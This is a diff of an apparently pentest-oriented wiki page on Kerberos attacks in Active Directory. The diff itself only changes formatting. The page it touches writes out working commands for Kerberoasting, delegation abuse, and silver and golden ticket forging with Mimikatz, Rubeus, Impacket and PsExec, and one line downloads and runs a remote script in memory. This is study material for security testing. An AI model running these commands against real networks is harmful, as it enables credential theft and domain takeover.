@@ -12,7 +12,7 @@ Those are just some of the methods that can be used to exploit this system. Here
 
 Kerbrute enumeration would abuse port 88 and attempt to brute force out possible usernames stored within the Kerberos system.​ Tools like Kerbrute can do this:
 
-<figure><img src="../../.gitbook/assets/image (817).png" alt=""><figcaption><p><em>Kerbrute</em></p></figcaption></figure>
+![Kerbrute](<../../.gitbook/assets/image%20(817).png>)
 
 Above is a snapshot of the machine, and we can see how we are able to find some usernames from this.
 
@@ -25,15 +25,12 @@ Above is a snapshot of the machine, and we can see how we are able to find some 
 
 This would make use of the fact that we are able to spoof SPNs. A spoofed account can harvest TGS tickets for services that run on behalf of user accounts in the AD. Parts of the TGS is encryupted with user passwords, and can be cracked offline.
 
-{% code title="From Linux" overflow="wrap" %}
 ```bash
 GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
 
 GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
 ```
-{% endcode %}
 
-{% code title="Windows Memory to Disk" overflow="wrap" %}
 ```powershell
 Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service accounts
 
@@ -45,9 +42,7 @@ klist #List kerberos tickets in memory
  
 Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder  
 ```
-{% endcode %}
 
-{% code title="Rubeus and Powershell" overflow="wrap" %}
 ```powershell
 # Powerview
 Request-SPNTicket -SPN "<SPN>" 
@@ -60,7 +55,6 @@ Request-SPNTicket -SPN "<SPN>"
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
-{% endcode %}
 
 ## Unconstrained Delegation
 
@@ -70,13 +64,10 @@ This means the ticket can be used to sort of impersonate the authenticated user,
 
 Naturally, this isn't secure, because someone with unauthorized acccess can basically have a TGT to crack immediately, and would be able to decipher user passwords. Either that or they can Pass The Ticket and be able to do other stuff as that user.
 
-{% code title="Enumeration" overflow="wrap" %}
 ```powershell
 Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description # PowerView
 ```
-{% endcode %}
 
-{% code title="Exploitation" %}
 ```powershell
 Import-Module .\Invoke-Mimikatz.ps1
 Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
@@ -88,7 +79,6 @@ $session = New-PSSession -Computer ComputerNAME
 Invoke-Command -ScriptBlock{whoami;hostname} -computername COMPUTERNAME
 #establish a remote PS session and RCE as another user
 ```
-{% endcode %}
 
 ## Constrained Delegation
 
@@ -122,7 +112,6 @@ For this, we would need to do the following:
 
 This would rely on the `msds-allowedtoactonbehalfofotheridentity` privilege.
 
-{% code overflow="wrap" %}
 ```powershell
 Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 # check which users have this privilege
@@ -151,7 +140,6 @@ Get-DomainComputer <TARGET NAME> | Set-DomainObject -Set @{'msds-allowedtoactonb
 .\PsExec.exe \\<TARGET NAME> cmd 
 #spawn command shell for new computer
 ```
-{% endcode %}
 
 ## Silver Tickets
 
@@ -159,7 +147,6 @@ Silver tickets are possible because we can basically **create our own valid TGS 
 
 This attack is more limited in power relative to Golden Ticket attacks.
 
-{% code title="Linux" overflow="wrap" %}
 ```bash
 python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-...  -domain domain.com -spn <domain>/<user> <filename>
 # create new ticket
@@ -170,9 +157,7 @@ export KRB5CCNAME=<filename>.ccache
 python psexec.py <domain>/<user>@<IP> -k -no-pass
 #achieve RCE through psexec using ticket as authentication
 ```
-{% endcode %}
 
-{% code title="Windows" overflow="wrap" %}
 ```powershell
 #Create ticket
 mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-... /rc4:<LM HASH> /user:administrator /service:cifs /target:<computer name>"
@@ -184,7 +169,6 @@ mimikatz.exe "kerberos::ptt ticket.kirbi"
 #Obtain a shell
 .\PsExec.exe -accepteula \\<computer name> cmd
 ```
-{% endcode %}
 
 ## Golden Tickets <a href="#golden-tickets" id="golden-tickets"></a>
 
@@ -192,7 +176,6 @@ Once we have pwned the administrator, then a valid TGT for **any user** can be c
 
 This can also be used to dump credentials of all users from the registry.
 
-{% code title="Linux" overflow="wrap" %}
 ```bash
 python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-...  -domain domain.com -spn <domain>/<user> <filename>
 # create new ticket
@@ -203,9 +186,7 @@ export KRB5CCNAME=<filename>.ccache
 python psexec.py <domain>/<user>@<IP> -k -no-pass
 #achieve RCE through psexec using ticket as authentication
 ```
-{% endcode %}
 
-{% code title="" overflow="wrap" %}
 ```powershell
 #mimikatz
 kerberos::golden /User:Administrator /domain:domain.com /sid:S-1-5-21... /krbtgt:<HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
@@ -215,7 +196,6 @@ klist #List tickets in memory
 # Example using aes key
 kerberos::golden /user:Administrator /domain:domain.com /sid<SID of admin> /aes256:<AES Key> /ticket:pwned.kirbi
 ```
-{% endcode %}
 
 ## Mitigations <a href="#mitigations" id="mitigations"></a>
 
